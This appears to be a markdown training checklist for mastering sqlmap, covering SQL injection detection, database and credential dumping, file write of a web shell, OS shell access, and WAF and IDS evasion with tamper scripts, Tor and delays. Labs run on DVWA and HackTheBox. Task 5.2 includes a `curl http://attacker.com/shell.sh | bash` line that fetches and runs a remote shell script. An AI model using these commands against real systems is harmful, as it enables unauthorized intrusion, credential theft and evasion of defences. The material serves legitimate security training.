# 💉 sqlmap: Complete Mastery Checklist

> **What is sqlmap?** sqlmap is an open-source automated SQL injection tool. It detects and exploits SQL injection vulnerabilities in web applications — testing injection points, fingerprinting the database type, extracting schema and data, and in some cases achieving OS-level code execution. It supports every major database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.) and covers all SQL injection techniques (error-based, blind boolean, time-based, union-based, stacked queries, out-of-band).
>
> **Why does it exist?** Manual SQL injection testing is time-consuming and error-prone, especially for blind injection where you have to infer results one bit at a time. sqlmap automates the entire process — detection, technique selection, and data extraction — saving hours of manual work.
>
> **When to use it:** After manually confirming or suspecting SQL injection on a parameter. Extracting database content after confirming injection. Testing all parameters of a web application for injection. Bug bounty and pentest engagements with SQLi in scope.
>
> **When to avoid it:** Without authorization — sqlmap sends thousands of requests and is highly detectable. When you want to understand the vulnerability deeply first — use manual injection to understand it before automating. In extremely noisy environments where you need stealth (sqlmap generates obvious patterns).
>
> **What mastering sqlmap unlocks:** Full automated SQL injection exploitation. Database enumeration and credential extraction. Understanding of all SQL injection techniques. Post-exploitation via SQLi (file read/write, OS command execution in some cases).

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | Detection | 5 | 3–4 hours |
| 3 | Enumeration | 5 | 3–5 hours |
| 4 | Advanced Techniques | 4 | 3–4 hours |
| 5 | Post-Exploitation | 3 | 2–3 hours |
| 6 | Evasion | 3 | 2–3 hours |
| 7 | Practical Labs | 4 | 4–6 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **32** | **~22–33 hours** |

**Prerequisites:** SQL basics (SELECT, WHERE, UNION, error messages). HTTP request/response structure. Understanding of how web applications interact with databases. Burp Suite experience (for capturing requests).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — SQL Injection Concepts

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **What is SQLi** | Injection of SQL syntax into user-controlled input that gets incorporated unsanitized into a SQL query. The database executes attacker-controlled SQL. |
| **Error-based** | Application returns database error messages revealing schema info. Fast but requires visible errors. |
| **Union-based** | `UNION SELECT` appends attacker-controlled data to the result set. Returns data directly. Requires knowing column count and types. |
| **Boolean blind** | No error or data visible — only boolean response (page differs or is the same). Infer data one bit at a time. Slow. |
| **Time-based blind** | Inject a sleep function (`SLEEP(5)`). If response delays, injection confirmed. Even slower but works when no response difference exists. |
| **Stacked queries** | Execute multiple queries in one statement (`; DROP TABLE users--`). MSSQL: enabled. MySQL: depends on API. |
| **OOB** | Out-of-band: exfiltrate data via DNS or HTTP to attacker-controlled server. Works when no in-band data channel exists. |

---

### Task 1.2 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Kali** | Pre-installed. `sqlmap --version`. |
| **Manual** | `git clone https://github.com/sqlmapproject/sqlmap`. `python3 sqlmap.py`. |

---

### Task 1.3 — Essential Flags

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Target** | `-u "http://target.com/page?id=1"` — URL with parameter. `-r request.txt` — raw HTTP request file (from Burp). |
| **Database** | `--dbs` — list databases. `-D dbname` — use this database. `--tables` — list tables. `-T tablename` — use this table. `--columns` — list columns. `--dump` — dump table data. |
| **Speed** | `--level=5 --risk=3` — more tests (default 1/1). `--threads=10` — parallel requests (faster). |
| **Technique** | `--technique=BEU` — only use Boolean, Error, Union. |
| **Batch** | `--batch` — use defaults for all prompts (non-interactive). |

---

### Task 1.4 — Using a Burp Request File

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Capture** | Burp Suite → intercept request → right-click → Save item → `request.txt`. Or copy raw request and paste. |
| **Run** | `sqlmap -r request.txt --batch --dbs`. |
| **Mark Parameter** | If sqlmap tests the wrong param: `sqlmap -r request.txt -p "id" --batch`. |
| **POST** | sqlmap handles POST bodies automatically from `-r` file. Or: `sqlmap -u "http://target.com/login" --data="user=test&pass=test"`. |

---

### Task 1.5 — Risk and Level

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Level** | 1–5. Default 1. Higher = more injection tests per parameter. Level 3+ tests cookie and User-Agent headers. Level 5 = exhaustive. |
| **Risk** | 1–3. Default 1. Higher risk = tests more dangerous payloads (can cause data modification). Risk 2: adds time-based blind. Risk 3: adds OR-based payloads (may cause logic changes). Use risk 3 only in controlled environments. |
| **Recommendation** | Start with default (1/1). If no detection: try `--level=3 --risk=2`. If still nothing: `--level=5 --risk=3 --technique=T` (time-based only, safest for blind). |

---

# PHASE 2: DETECTION

---

### Task 2.1 — Basic Injection Point Detection

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `sqlmap -u "http://target.com/items?id=1" --batch`. |
| **Output** | sqlmap tells you: parameter is vulnerable, injection technique (union/boolean/error/time), and database type. |
| **What sqlmap Tests** | Single quote, double quote, comments, AND 1=1, UNION probes, time delays — automatically. |

---

### Task 2.2 — Testing POST Parameters

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Data Flag** | `sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch`. |
| **Mark Injection Point** | `--data="username=admin*&password=test"` — `*` marks the injection point explicitly. |

---

### Task 2.3 — Testing Headers and Cookies

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Cookie** | `sqlmap -u "http://target.com/" --cookie="session=abc123; id=1" -p "id" --batch`. |
| **Headers** | `sqlmap -u "http://target.com/" -H "X-Forwarded-For: 1*" --batch`. |
| **Level 3+** | `--level=3` automatically tests Referer and User-Agent headers for injection. |

---

### Task 2.4 — Second-Order Injection

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | Input is stored in the database and then later used in a SQL query — not directly in the immediate response. |
| **sqlmap** | `sqlmap -r request.txt --second-url="http://target.com/profile"`. sqlmap injects at the first URL and detects injection at the second URL's response. |

---

### Task 2.5 — Confirmation of False Positives

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Verify** | If sqlmap says vulnerable: manually test the payload sqlmap used. Confirm the behavior (error, timing, data) is real and not an application quirk. |
| **WAF Interference** | If the application has a WAF that blocks and returns 403 for any anomalous input, sqlmap may behave unpredictably. Use `--identify-waf` and bypass techniques. |

---

# PHASE 3: ENUMERATION

---

### Task 3.1 — Database Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Current DB** | `sqlmap -u "http://target/?id=1" --current-db --batch`. |
| **All DBs** | `--dbs` — list all accessible databases. |
| **Tables** | `-D targetdb --tables` — list tables in a database. |
| **Columns** | `-D targetdb -T users --columns` — list columns in a table. |
| **Dump** | `-D targetdb -T users --dump` — dump all rows. |

---

### Task 3.2 — Targeted Dump

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Specific Columns** | `-D db -T users -C "username,password" --dump`. |
| **Row Limit** | `--start=1 --stop=10` — dump rows 1 through 10 only. |
| **Where** | `--where="id=1"` — equivalent to SQL WHERE clause. |

---

### Task 3.3 — Dumping Credentials

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Users Table** | `-D db -T users -C "username,password,email" --dump`. |
| **Hash Detection** | sqlmap recognizes hash formats in dumped columns. Offers to crack them automatically: `do you want to crack them via a dictionary-based attack? [Y/n]`. |
| **Crack Inline** | sqlmap runs JtR/Hashcat internally when you confirm. Or decline and crack manually with JtR/Hashcat. |

---

### Task 3.4 — Schema Dump

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Full Schema** | `--schema` — dump entire database schema (all tables and columns in all databases). |
| **Search** | `--search -C password` — search across all tables for columns named "password". |

---

### Task 3.5 — Database Users and Privileges

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Current User** | `--current-user` — which DB user the app is running as. |
| **All Users** | `--users` — list all database user accounts. |
| **Passwords** | `--passwords` — dump hashed DB user passwords. |
| **Privileges** | `--privileges` — what can the current user do? DBA privileges → `--is-dba` → if true, code execution may be possible. |

---

# PHASE 4: ADVANCED TECHNIQUES

---

### Task 4.1 — File Read and Write

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Read** | `--file-read="/etc/passwd"` — read a server-side file via LOAD_FILE() (MySQL, requires FILE privilege). |
| **Write** | `--file-write="shell.php" --file-dest="/var/www/html/shell.php"` — write a file to the server (requires write permission + FILE privilege). |
| **Prerequisite** | DB user must have FILE privilege. MySQL: `SHOW GRANTS FOR CURRENT_USER()`. `--is-dba` = true is a good indicator. |

---

### Task 4.2 — OS Shell

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `--os-shell` — attempt to get an interactive OS shell via SQL injection. |
| **Method** | Writes a web shell or uses xp_cmdshell (MSSQL), sys.exec (PostgreSQL), or LOAD_FILE+INTO OUTFILE (MySQL) to execute OS commands. |
| **Requirements** | Stacked queries must be possible. DBA-level privilege. Writable web directory for MySQL. |

---

### Task 4.3 — Proxy and Tor

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Proxy** | `--proxy="http://127.0.0.1:8080"` — route through Burp to see all sqlmap requests. |
| **Tor** | `--tor --tor-type=SOCKS5` — route through Tor for anonymity. |
| **Delay** | `--delay=1` — 1-second delay between requests. Reduces detection signature. `--randomize-ua` — randomize User-Agent per request. |

---

### Task 4.4 — Optimizing Blind Injection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Speed Up** | `--threads=5` — parallel requests. `--technique=B` — boolean only (faster than time-based). |
| **Time-based Tuning** | `--time-sec=3` — adjust expected delay (default 5 seconds). Lower = faster but may miss slow servers. |
| **Dump Optimization** | `--string="Welcome"` — tell sqlmap which string indicates a "true" response for boolean blind (avoids autodetection errors). |

---

# PHASE 5: POST-EXPLOITATION

---

### Task 5.1 — Out-of-Band Exfiltration

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **When** | No in-band data visible. DNS/HTTP outbound from database server is possible. |
| **sqlmap OOB** | `--technique=O` — out-of-band technique. Requires `--dns-domain=yourdomain.com` (you must control this domain and monitor DNS lookups). |

---

### Task 5.2 — Pivoting via SQLi

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Use OS command execution via SQLi to gain a foothold and pivot. |
| **Workflow** | `--os-shell` → execute `curl http://attacker.com/shell.sh | bash` → reverse shell → post-exploitation. |

---

### Task 5.3 — sqlmap Output Files

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Location** | `~/.local/share/sqlmap/output/target.com/`. |
| **Contents** | `log` (all requests). `session.sqlite` (results cache — sqlmap remembers what it found). `dump/` (extracted data). |
| **Share** | Copy dump files for reporting. Session file lets you resume without re-running all probes. |

---

# PHASE 6: EVASION

---

### Task 6.1 — Tamper Scripts

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Purpose** | Modify sqlmap's payloads to bypass WAF/IDS filters. |
| **Use** | `--tamper=space2comment` — replaces spaces with `/**/`. `--tamper=between` — replaces `>` with `BETWEEN`. `--tamper=randomcase` — random uppercase/lowercase. Multiple: `--tamper=space2comment,randomcase`. |
| **List** | `sqlmap --list-tampers` — see all available tamper scripts. |
| **Custom** | Write a Python tamper script: receives a payload → returns modified payload. |

---

### Task 6.2 — WAF Identification

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Detect** | `--identify-waf` — sqlmap probes to identify the WAF (Cloudflare, ModSecurity, Imperva etc.). |
| **Response** | Knowing the WAF type guides tamper script selection. Cloudflare: `space2comment`, `charunicodeescape`. ModSecurity: `between`, `equaltolike`. |

---

### Task 6.3 — Reducing Noise

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Slow It Down** | `--delay=2 --safe-freq=3` — delay 2 seconds per request. Every 3 malicious requests send 1 normal "safe" request to blend in. |
| **Limit Tests** | `--technique=U --level=1` — only union-based, minimal tests. Least noisy approach. |
| **Avoid Detection** | `--randomize-ua`. `--proxy` via Burp or Tor. `--prefix="/*!*/` and `--suffix` for custom comment bypass. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — DVWA SQLi (Beginner)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| **Scenario** | DVWA (Damn Vulnerable Web Application) → SQL Injection (Low security). Capture the request in Burp → run sqlmap from `-r request.txt`. Enumerate databases, tables, dump users table. |
| **Success Criteria** | Databases listed. Users table dumped. Admin password hash extracted. |

---

### Lab 7.2 — Blind Injection Lab

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min

| **Scenario** | DVWA SQL Injection (Medium security — blind). Run sqlmap with `--technique=B` (boolean blind). Dump user data. Compare time taken vs. union-based. Understand the speed difference. |
| **Success Criteria** | Data extracted via boolean blind. Time comparison documented. |

---

### Lab 7.3 — WAF Bypass Lab

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | DVWA with ModSecurity WAF enabled (or bWAPP with WAF rules). Run sqlmap without tamper → fails. Identify WAF. Apply tamper scripts. Successfully extract data through WAF. |
| **Success Criteria** | WAF bypassed with tamper scripts. Data extracted. Bypass technique documented. |

---

### Lab 7.4 — Real Application (HackTheBox/TryHackMe)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | HTB/THM machine with SQL injection. Find the vulnerable parameter manually (Burp). Confirm injection manually (single quote test). Then automate extraction with sqlmap. Document both manual confirmation and automated extraction. |
| **Success Criteria** | Vulnerability confirmed manually. sqlmap extraction automated. Flag captured. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Full Exploitation Chain

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 90 min

| **Scenario** | Find an SQLi vulnerability in an application (lab). Extract the credentials. Crack the hashes (JtR/Hashcat). Log in to the application with cracked credentials. Escalate to admin. Document the full chain: SQLi → credentials → application access. |
| **Success Criteria** | Complete chain documented. Admin access achieved. |

---

### Challenge 8.2 — OS Shell via SQLi

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | On a lab MySQL server where the app user has DBA privileges and the web root is writable: use `--os-shell` to get OS command execution. Execute `id`, `whoami`. Attempt privilege escalation from the www-data shell. |
| **Success Criteria** | OS shell obtained via sqlmap. `id` output retrieved. |

---

### Challenge 8.3 — Custom Tamper Script

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Analyze a WAF rule that blocks sqlmap's default payloads. Write a custom Python tamper script that modifies the payload to bypass the specific filter. Test against the WAF. |
| **Success Criteria** | Custom tamper script functional. sqlmap extracts data through the WAF using the custom script. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can detect SQL injection with sqlmap from URL and Burp request file | ☐ |
| Can enumerate databases, tables, columns, and dump data | ☐ |
| Can test cookies, headers, and POST parameters | ☐ |
| Can use tamper scripts to bypass WAFs | ☐ |
| Can read and write files via SQL injection | ☐ |
| Can obtain OS shell via `--os-shell` in appropriate conditions | ☐ |
| Can optimize blind injection speed | ☐ |
| Can confirm SQLi manually before automating with sqlmap | ☐ |
| Can integrate sqlmap output with JtR for credential cracking | ☐ |
| Knows the legal and ethical requirements for sqlmap use | ☐ |

---

## 🎯 Interview Questions

1. What are the six types of SQL injection techniques sqlmap supports?
2. What is the difference between `--level` and `--risk` in sqlmap?
3. How do you use sqlmap with a raw Burp request file?
4. What is a tamper script and how does it help bypass WAFs?
5. What prerequisites are needed for sqlmap's `--file-write` to work?
6. How do you use sqlmap for blind SQL injection when no visible data is returned?
7. How do you minimize sqlmap's detection footprint?
8. What is second-order SQL injection and how does sqlmap test for it?
9. How would you manually confirm an SQLi vulnerability before running sqlmap?
10. What does it mean if `--is-dba` returns true during a sqlmap scan?
